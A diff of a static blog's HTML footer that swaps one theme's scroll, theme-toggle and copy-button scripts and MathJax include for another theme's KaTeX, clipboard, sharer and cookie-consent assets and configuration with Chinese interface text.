-    var mybutton = document.getElementById("top-link");
-    window.onscroll = function () {
-        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
-            mybutton.style.visibility = "visible";
-            mybutton.style.opacity = "1";
-        } else {
-            mybutton.style.visibility = "hidden";
-            mybutton.style.opacity = "0";
-        }
-    };
-
-</script>
-<script>
-    document.getElementById("theme-toggle").addEventListener("click", () => {
-        if (document.body.className.includes("dark")) {
-            document.body.classList.remove('dark');
-            localStorage.setItem("pref-theme", 'light');
-        } else {
-            document.body.classList.add('dark');
-            localStorage.setItem("pref-theme", 'dark');
-        }
-    })
-
-</script>
-<script>
-    document.querySelectorAll('pre > code').forEach((codeblock) => {
-        const container = codeblock.parentNode.parentNode;
-
-        const copybutton = document.createElement('button');
-        copybutton.classList.add('copy-code');
-        copybutton.innerText = 'copy';
-
-        function copyingDone() {
-            copybutton.innerText = 'copied!';
-            setTimeout(() => {
-                copybutton.innerText = 'copy';
-            }, 2000);
-        }
-
-        copybutton.addEventListener('click', (cb) => {
-            if ('clipboard' in navigator) {
-                navigator.clipboard.writeText(codeblock.textContent);
-                copyingDone();
-                return;
-            }
-
-            const range = document.createRange();
-            range.selectNodeContents(codeblock);
-            const selection = window.getSelection();
-            selection.removeAllRanges();
-            selection.addRange(range);
-            try {
-                document.execCommand('copy');
-                copyingDone();
-            } catch (e) { };
-            selection.removeRange(range);
-        });
-
-        if (container.classList.contains("highlight")) {
-            container.appendChild(copybutton);
-        } else if (container.parentNode.firstChild == container) {
-            
-        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
-            
-            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
-        } else {
-            
-            codeblock.parentNode.appendChild(copybutton);
-        }
-    });
-</script>
-<script type="text/javascript"
-  src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
-</script></body>
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div id="cookieconsent-container"></div><div class="assets"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/katex/copy-tex.min.css">
+        <noscript><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":50,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"sharerjs":true,"table":{"sort":true}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js" defer></script><script type="text/javascript" src="/lib/katex/auto-render.min.js" defer></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js" defer></script><script type="text/javascript" src="/lib/katex/mhchem.min.js" defer></script><script type="text/javascript" src="/js/katex.min.js" defer></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script type="text/javascript" src="/js/cookieconsent.min.js" defer></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+</body>
 
 </html>
